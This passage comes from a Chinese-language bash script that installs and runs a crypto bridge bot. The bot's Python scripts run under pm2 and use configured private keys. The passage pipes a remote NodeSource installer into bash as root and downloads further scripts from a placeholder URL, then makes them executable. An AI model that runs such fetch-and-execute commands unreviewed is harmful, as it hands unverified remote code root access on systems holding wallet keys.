        print_message "$RED" "❗ 无法更新包列表😢"
        exit 1
    }
    
    # 安装基本依赖
    for pkg in curl wget jq python3 python3-pip python3-dev python3-venv python3-full bc coreutils; do
        if ! dpkg -l | grep -q "^ii.*$pkg "; then
            print_message "$CYAN" "📦 安装 $pkg...🚚"
            apt-get install -y "$pkg" || {
                print_message "$RED" "❗ 无法安装 $pkg😢"
                exit 1
            }
        else
            print_message "$GREEN" "✅ $pkg 已安装🎉"
        fi
    done

    # 创建虚拟环境
    VENV_PATH="/root/bridge-bot-venv"
    if [ ! -d "$VENV_PATH" ]; then
        print_message "$CYAN" "📦 创建虚拟环境...🚚"
        python3 -m venv "$VENV_PATH" || {
            print_message "$RED" "❗ 无法创建虚拟环境，请检查 Python 环境和权限😢"
            exit 1
        }
    fi

    # 激活虚拟环境并安装 Python 依赖
    source "$VENV_PATH/bin/activate" || {
        print_message "$RED" "❗ 无法激活虚拟环境😢"
        exit 1
    }

    # 安装/升级 pip
    python3 -m pip install --upgrade pip || {
        print_message "$RED" "❗ 无法升级 pip😢"
        exit 1
    }

    # 安装 Python 依赖
    pip install web3 requests python-dotenv eth_account || {
        print_message "$RED" "❗ 无法安装 Python 依赖😢"
        exit 1
    }

    # 安装 Node.js 和 PM2
    if ! command -v node &> /dev/null; then
        print_message "$CYAN" "📦 安装 Node.js...🚚"
        curl -fsSL https://deb.nodesource.com/setup_18.x | bash - || {
            print_message "$RED" "❗ 无法设置 Node.js 源😢"
            exit 1
        }
        apt-get install -y nodejs || {
            print_message "$RED" "❗ 无法安装 Node.js😢"
            exit 1
        }
    fi

    if ! command -v pm2 &> /dev/null; then
        print_message "$CYAN" "📦 安装 PM2...🚚"
        npm install -g pm2 || {
            print_message "$RED" "❗ 无法安装 PM2😢"
            exit 1
        }
    fi

    print_message "$GREEN" "✅ 所有依赖安装完成！🎉"
}

# === 下载 Python 脚本 ===
download_python_scripts() {
    disable_debug
    print_message "$CYAN" "📥 正在下载 Python 脚本...🚀"
    
    # 下载脚本
    for script in "$ARB_SCRIPT" "$OP_SCRIPT" "$BALANCE_SCRIPT"; do
        if [ ! -f "$script" ]; then
            print_message "$CYAN" "📥 下载 $script..."
            curl -o "$script" "https://raw.githubusercontent.com/your-repo/$script" || {
                print_message "$RED" "❗ 无法下载 $script😢"
                exit 1
            }
            chmod +x "$script"
        else
            print_message "$GREEN" "✅ $script 已存在🎉"
        fi
    done

    print_message "$GREEN" "✅ Python 脚本下载完成！🎉"
}

# === 选择跨链方向 ===
select_direction() {
    disable_debug
    validate_points_file
    while true; do
        banner
        print_message "$CYAN" "🌉 请选择跨链方向："
        cat << EOF
1. ARB -> UNI 🌟
2. OP <-> UNI 🌟
EOF
        read -p "> " choice
        case $choice in
            1)
                echo "arb" > "$DIRECTION_FILE"
                print_message "$GREEN" "✅ 已选择 ARB -> UNI 方向！🎉"
                break
                ;;
            2)
                echo "op" > "$DIRECTION_FILE"
                print_message "$GREEN" "✅ 已选择 OP <-> UNI 方向！🎉"
                break
                ;;
            *)
                print_message "$RED" "❗ 无效选项！😢"
                ;;
        esac
    done
}

# === 启动运行 ===
start_running() {
    disable_debug
    validate_points_file
    
    # 检查必要的文件是否存在
    for script in "$ARB_SCRIPT" "$OP_SCRIPT" "$BALANCE_SCRIPT"; do
        if [ ! -f "$script" ]; then
            print_message "$RED" "❗ 错误：$script 不存在！请先下载脚本😢"
            return 1
        fi
    done

    # 检查虚拟环境
    VENV_PATH="/root/bridge-bot-venv"
    if [ ! -d "$VENV_PATH" ]; then
        print_message "$RED" "❗ 错误：虚拟环境不存在！请重新运行安装😢"
        return 1
    fi

    # 检查账户配置
    accounts=$(read_accounts)
    if [ "$(echo "$accounts" | jq 'length')" -eq 0 ]; then
        print_message "$RED" "❗ 错误：未配置任何账户！请先添加私钥😢"
        return 1
    fi

    # 停止现有进程
    print_message "$CYAN" "🛑 停止现有进程..."
    pm2 stop "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    pm2 delete "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1

    # 根据选择的方向启动相应的脚本
    direction=$(cat "$DIRECTION_FILE")
    script_path=""
    if [ "$direction" = "arb" ]; then
        script_path="$ARB_SCRIPT"
    else
        script_path="$OP_SCRIPT"
    fi

    # 启动主脚本
    print_message "$CYAN" "🚀 启动主脚本..."
    source "$VENV_PATH/bin/activate" && pm2 start "$script_path" --name "$PM2_PROCESS_NAME" || {
        print_message "$RED" "❗ 启动主脚本失败😢"
        return 1
    }

    # 启动余额监控
    print_message "$CYAN" "📊 启动余额监控..."
    source "$VENV_PATH/bin/activate" && pm2 start "$BALANCE_SCRIPT" --name "$PM2_BALANCE_NAME" || {
        print_message "$RED" "❗ 启动余额监控失败😢"
        return 1
    }

    print_message "$GREEN" "✅ 脚本已成功启动！🎉"
    print_message "$CYAN" "💡 使用 '查看日志' 选项可以查看运行状态"
}

# === 停止运行 ===
stop_running() {
    disable_debug
    print_message "$CYAN" "🛑 正在停止所有进程..."
    pm2 stop "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    pm2 delete "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    print_message "$GREEN" "✅ 所有进程已停止！🎉"
}

# === 查看日志 ===
view_logs() {
    disable_debug
    while true; do
        banner
        print_message "$CYAN" "📜 日志查看："
        cat << EOF
1. 查看主脚本日志 📝
2. 查看余额监控日志 📊
3. 返回 🔙
EOF
        read -p "> " sub_choice
        case $sub_choice in
            1)
                pm2 logs "$PM2_PROCESS_NAME" --lines 100 | cat
                ;;
            2)
                pm2 logs "$PM2_BALANCE_NAME" --lines 100 | cat
                ;;
            3)
                break
                ;;
            *)
                print_message "$RED" "❗ 无效选项！😢"
                ;;
        esac
        read -p "按回车继续... ⏎"
    done
}

# === 删除脚本 ===
delete_script() {
    disable_debug
    print_message "$RED" "⚠️ 警告：此操作将删除所有脚本和配置！确定要继续吗？(y/N)"
    read -p "> " confirm
    if [ "$confirm" != "y" ] && [ "$confirm" != "Y" ]; then
        print_message "$CYAN" "🔄 操作已取消"
        return
    fi

    # 停止所有进程
    stop_running

    # 删除文件
    rm -f "$ARB_SCRIPT" "$OP_SCRIPT" "$BALANCE_SCRIPT" "$CONFIG_FILE" "$DIRECTION_FILE" "$RPC_CONFIG_FILE" "$POINTS_JSON" "$POINTS_HASH_FILE"
    rm -rf "/root/bridge-bot-venv"

    print_message "$GREEN" "✅ 脚本已完全删除！🎉"
    exit 0
}

# === 主函数 ===
main() {
    disable_debug
    # 检查 root 权限
    check_root

    # 初始化配置
    init_config

    # 安装依赖
    install_dependencies

    # 下载 Python 脚本
    download_python_scripts

    # 启动主菜单
    main_menu
}

# 启动主函数
main "$@"
